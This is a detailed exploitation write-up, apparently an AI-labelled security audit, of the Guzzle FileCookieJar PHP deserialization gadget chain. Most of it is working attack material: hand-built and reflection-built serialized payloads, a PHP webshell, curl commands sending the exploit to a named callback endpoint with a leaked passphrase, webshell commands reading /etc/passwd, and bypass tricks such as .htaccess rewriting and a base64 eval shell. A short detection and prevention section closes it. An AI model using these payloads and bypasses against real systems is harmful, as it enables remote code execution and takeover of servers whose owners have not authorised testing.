# FileCookieJar Gadget Chain - Detailed Technical Analysis
## GuzzleHttp\Cookie\FileCookieJar → Arbitrary File Write → RCE

**Date:** 2025-12-24  
**Auditor:** GitHub Copilot  
**Focus:** Complete technical breakdown of FileCookieJar gadget chain  

---

## 1. GADGET CHAIN OVERVIEW

### Class Hierarchy

```
GuzzleHttp\Cookie\FileCookieJar extends GuzzleHttp\Cookie\CookieJar
    │
    ├── private $filename          ← TARGET FILE PATH (attacker controlled)
    ├── private $storeSessionCookies ← Must be TRUE for persistence
    │
    └── parent: CookieJar
        ├── private $cookies = []  ← Array of SetCookie objects
        └── private $strictMode    ← Ignored in exploit
```

### Execution Flow

```
┌─────────────────────────────────────────────────────────────┐
│ 1. unserialize($_POST['arguments'])                         │
│    └── PHP recreates FileCookieJar object with our values   │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. Script ends / Object goes out of scope                   │
│    └── PHP calls __destruct() on all objects                │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. FileCookieJar::__destruct()                              │
│    └── $this->save($this->filename)                         │
│        └── $filename = "/var/www/html/shell.php"            │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. FileCookieJar::save($filename)                           │
│    └── foreach ($this as $cookie)                           │
│        └── Iterates over $this->cookies (from CookieJar)    │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. CookieJar::shouldPersist($cookie, $storeSessionCookies)  │
│    └── Returns TRUE if:                                     │
│        • $cookie->getExpires() is set OR $storeSessionCookies│
│        • $cookie->getDiscard() is FALSE                     │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ 6. SetCookie::toArray()                                     │
│    └── return $this->data;                                  │
│        └── Contains our PHP payload in 'Value' field        │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ 7. json_encode($json)                                       │
│    └── Converts array to JSON string                        │
│        └── Our PHP code is inside JSON                      │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ 8. file_put_contents($filename, $jsonStr, LOCK_EX)          │
│    └── Writes to /var/www/html/shell.php                    │
│        └── ARBITRARY FILE WRITE ACHIEVED!                   │
└─────────────────────────────────────────────────────────────┘
```

---

## 2. SOURCE CODE ANALYSIS

### FileCookieJar.php (Complete)

```php
<?php
namespace GuzzleHttp\Cookie;

class FileCookieJar extends CookieJar
{
    /** @var string filename */
    private $filename;                    // [1] Attacker controls this

    /** @var bool */
    private $storeSessionCookies;         // [2] Must be TRUE

    public function __construct($cookieFile, $storeSessionCookies = false)
    {
        parent::__construct();
        $this->filename = $cookieFile;    // [3] Sets target path
        $this->storeSessionCookies = $storeSessionCookies;

        if (file_exists($cookieFile)) {   // [4] Skipped if file doesn't exist
            $this->load($cookieFile);
        }
    }

    public function __destruct()          // [5] TRIGGER POINT
    {
        $this->save($this->filename);     // [6] Calls save() with our path
    }

    public function save($filename)
    {
        $json = [];
        foreach ($this as $cookie) {      // [7] Iterates CookieJar::$cookies
            if (CookieJar::shouldPersist($cookie, $this->storeSessionCookies)) {
                $json[] = $cookie->toArray();  // [8] Gets our payload
            }
        }

        $jsonStr = \GuzzleHttp\json_encode($json);  // [9] Encodes to JSON
        if (false === file_put_contents($filename, $jsonStr, LOCK_EX)) {
            throw new \RuntimeException("Unable to save file {$filename}");
        }
        // [10] FILE WRITTEN!
    }
}
```

### CookieJar.php (Relevant Parts)

```php
<?php
namespace GuzzleHttp\Cookie;

class CookieJar implements CookieJarInterface
{
    private $cookies = [];      // [A] Our SetCookie objects stored here
    private $strictMode;

    // [B] This determines if cookie is persisted
    public static function shouldPersist(SetCookie $cookie, $allowSessionCookies = false)
    {
        // Returns TRUE if:
        // - Cookie has Expires OR $allowSessionCookies is TRUE
        // - Cookie's Discard is FALSE
        if ($cookie->getExpires() || $allowSessionCookies) {
            if (!$cookie->getDiscard()) {
                return true;    // [C] Cookie will be saved
            }
        }
        return false;
    }

    // [D] Called during iteration (foreach $this as $cookie)
    public function getIterator()
    {
        return new \ArrayIterator(array_values($this->cookies));
    }
}
```

### SetCookie.php (Relevant Parts)

```php
<?php
namespace GuzzleHttp\Cookie;

class SetCookie
{
    private static $defaults = [
        'Name'     => null,
        'Value'    => null,      // [X] Our PHP payload goes here
        'Domain'   => null,
        'Path'     => '/',
        'Max-Age'  => null,
        'Expires'  => null,      // [Y] Must be set (or storeSessionCookies=true)
        'Secure'   => false,
        'Discard'  => false,     // [Z] Must be FALSE
        'HttpOnly' => false
    ];

    private $data;

    public function __construct(array $data = [])
    {
        $this->data = array_replace(self::$defaults, $data);
    }

    // [W] This returns our payload for JSON encoding
    public function toArray()
    {
        return $this->data;
    }

    public function getExpires()  { return $this->data['Expires']; }
    public function getDiscard()  { return $this->data['Discard']; }
    public function getValue()    { return $this->data['Value']; }
}
```

---

## 3. SERIALIZATION MECHANICS

### PHP Serialization Format

```
O:<length>:"<classname>":<property_count>:{<properties>}
```

### FileCookieJar Serialized Structure

```
O:29:"GuzzleHttp\Cookie\FileCookieJar":4:{
    s:39:"\0GuzzleHttp\Cookie\FileCookieJar\0filename";
    s:21:"/var/www/html/x.php";
    
    s:49:"\0GuzzleHttp\Cookie\FileCookieJar\0storeSessionCookies";
    b:1;
    
    s:36:"\0GuzzleHttp\Cookie\CookieJar\0cookies";
    a:1:{
        i:0;
        O:27:"GuzzleHttp\Cookie\SetCookie":1:{
            s:33:"\0GuzzleHttp\Cookie\SetCookie\0data";
            a:9:{
                s:4:"Name";s:1:"x";
                s:5:"Value";s:29:"<?php system($_GET['c']); ?>";
                s:6:"Domain";s:9:"localhost";
                s:4:"Path";s:1:"/";
                s:7:"Max-Age";N;
                s:7:"Expires";i:1735500000;
                s:6:"Secure";b:0;
                s:7:"Discard";b:0;
                s:8:"HttpOnly";b:0;
            }
        }
    }
    
    s:39:"\0GuzzleHttp\Cookie\CookieJar\0strictMode";
    b:0;
}
```

### Key Serialization Notes

1. **Private Properties**: Use null bytes (`\0ClassName\0property`)
2. **Protected Properties**: Use `\0*\0property`
3. **Public Properties**: Use just `property`

---

## 4. PAYLOAD CONSTRUCTION

### Method 1: Manual Serialization

```php
<?php
// Build serialized payload manually (minimal dependencies)

$filename = "/var/www/html/cache/shell.php";
$phpCode = '<?php system($_GET["c"]); ?>';
$expires = time() + 86400;

$payload = 'O:29:"GuzzleHttp\Cookie\FileCookieJar":4:{';
$payload .= 's:39:"' . "\0" . 'GuzzleHttp\Cookie\FileCookieJar' . "\0" . 'filename";';
$payload .= 's:' . strlen($filename) . ':"' . $filename . '";';
$payload .= 's:49:"' . "\0" . 'GuzzleHttp\Cookie\FileCookieJar' . "\0" . 'storeSessionCookies";';
$payload .= 'b:1;';
$payload .= 's:36:"' . "\0" . 'GuzzleHttp\Cookie\CookieJar' . "\0" . 'cookies";';
$payload .= 'a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{';
$payload .= 's:33:"' . "\0" . 'GuzzleHttp\Cookie\SetCookie' . "\0" . 'data";';
$payload .= 'a:9:{';
$payload .= 's:4:"Name";s:1:"x";';
$payload .= 's:5:"Value";s:' . strlen($phpCode) . ':"' . $phpCode . '";';
$payload .= 's:6:"Domain";s:9:"localhost";';
$payload .= 's:4:"Path";s:1:"/";';
$payload .= 's:7:"Max-Age";N;';
$payload .= 's:7:"Expires";i:' . $expires . ';';
$payload .= 's:6:"Secure";b:0;';
$payload .= 's:7:"Discard";b:0;';
$payload .= 's:8:"HttpOnly";b:0;';
$payload .= '}}}';
$payload .= 's:39:"' . "\0" . 'GuzzleHttp\Cookie\CookieJar' . "\0" . 'strictMode";';
$payload .= 'b:0;}';

echo "Raw payload:\n" . $payload . "\n\n";
echo "URL-encoded:\n" . urlencode($payload) . "\n";
?>
```

### Method 2: Using Reflection (Cleaner)

```php
<?php
// Requires Guzzle classes to be loaded

namespace GuzzleHttp\Cookie;

// Create SetCookie with payload
$cookie = new SetCookie([
    'Name'    => 'x',
    'Value'   => '<?php system($_GET["c"]); ?>',
    'Domain'  => 'localhost',
    'Path'    => '/',
    'Expires' => time() + 86400,
    'Discard' => false
]);

// Create FileCookieJar
$jar = new FileCookieJar('/var/www/html/cache/shell.php', true);

// Use reflection to access private $cookies in parent
$reflection = new \ReflectionClass('GuzzleHttp\Cookie\CookieJar');
$prop = $reflection->getProperty('cookies');
$prop->setAccessible(true);
$prop->setValue($jar, [$cookie]);

// Serialize
$payload = serialize($jar);
echo $payload;
?>
```

### Method 3: PHPGGC (Recommended)

```bash
# Using PHPGGC (PHP Generic Gadget Chains)
# https://github.com/ambionics/phpggc

./phpggc Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET["c"]); ?>'
```

---

## 5. OUTPUT FILE STRUCTURE

### What Gets Written

When `save()` executes, the file content will be:

```json
[{"Name":"x","Value":"<?php system($_GET[\"c\"]); ?>","Domain":"localhost","Path":"\/","Max-Age":null,"Expires":1735500000,"Secure":false,"Discard":false,"HttpOnly":false}]
```

### PHP Execution

When this file is accessed via HTTP, PHP processes it:

```
[{"Name":"x","Value":"                 ← Plain text, ignored by PHP
<?php system($_GET["c"]); ?>           ← PHP CODE EXECUTED!
","Domain":"localhost"...              ← Plain text, ignored
```

**Result:** The PHP code inside the JSON `Value` field is executed!

---

## 6. COMPLETE EXPLOITATION

### Step 1: Generate Payload

```bash
# Generate serialized FileCookieJar
php -r '
$p = "O:29:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:{s:39:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0filename\";s:28:\"/var/www/html/cache/x.php\";s:49:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0storeSessionCookies\";b:1;s:36:\"\0GuzzleHttp\\Cookie\\CookieJar\0cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"\0GuzzleHttp\\Cookie\\SetCookie\0data\";a:9:{s:4:\"Name\";s:1:\"x\";s:5:\"Value\";s:29:\"<?php system(\$_GET[c]); ?>\";s:6:\"Domain\";s:1:\"x\";s:4:\"Path\";s:1:\"/\";s:7:\"Max-Age\";N;s:7:\"Expires\";i:9999999999;s:6:\"Secure\";b:0;s:7:\"Discard\";b:0;s:8:\"HttpOnly\";b:0;}}}s:39:\"\0GuzzleHttp\\Cookie\\CookieJar\0strictMode\";b:0;}";
echo urlencode($p);
'
```

### Step 2: Send Exploit

```bash
curl -X POST "https://target.com/magnaCallback.php" \
  -d "passphrase=LEAKED_PASSPHRASE" \
  -d "function=test" \
  -d "arguments=O%3A29%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A..."
```

### Step 3: Access Webshell

```bash
curl "https://target.com/cache/x.php?c=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "https://target.com/cache/x.php?c=cat+/etc/passwd"
# Output: root:x:0:0:root:/root:/bin/bash ...
```

---

## 7. BYPASS TECHNIQUES

### Path Restrictions

If webroot is unknown or restricted:

```php
// Write to temp directory (always writable)
$filename = "/tmp/shell.php";

// Write to upload directory
$filename = "/var/www/html/media/shell.php";

// Use relative path from script location
$filename = "../../cache/shell.php";
```

### JSON Escaping Issues

If PHP code contains characters that break JSON:

```php
// Base64 encode the payload
$phpCode = '<?php eval(base64_decode($_GET["c"])); ?>';

// Then use base64 encoded commands:
// ?c=c3lzdGVtKCdpZCcpOw==  (system('id');)
```

### File Extension Restrictions

If `.php` is blocked:

```php
// Try alternative extensions
$filename = "/var/www/html/shell.phtml";
$filename = "/var/www/html/shell.php5";
$filename = "/var/www/html/shell.phar";

// Write .htaccess to make .txt execute as PHP
$filename = "/var/www/html/upload/.htaccess";
$phpCode = "AddType application/x-httpd-php .txt";
// Then write shell.txt
```

---

## 8. DETECTION & PREVENTION

### Detection Signatures

```
# IDS/WAF Rules
alert http any any -> any any (
    msg:"PHP Object Injection - FileCookieJar";
    content:"GuzzleHttp|5c|Cookie|5c|FileCookieJar";
    sid:1000001;
)

# Log Analysis
grep -E "FileCookieJar|GuzzleHttp.*Cookie" /var/log/apache2/access.log
```

### Prevention

```php
// NEVER use unserialize() on user input
// If absolutely necessary, use allowed_classes:
$data = unserialize($input, ['allowed_classes' => false]);

// Better: Use JSON instead
$data = json_decode($input, true);
```

---

## 9. REFERENCES

- PHP Object Injection: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
- PHPGGC Project: https://github.com/ambionics/phpggc
- Guzzle Source: https://github.com/guzzle/guzzle

---

*This detailed analysis is for authorized security testing purposes only.*
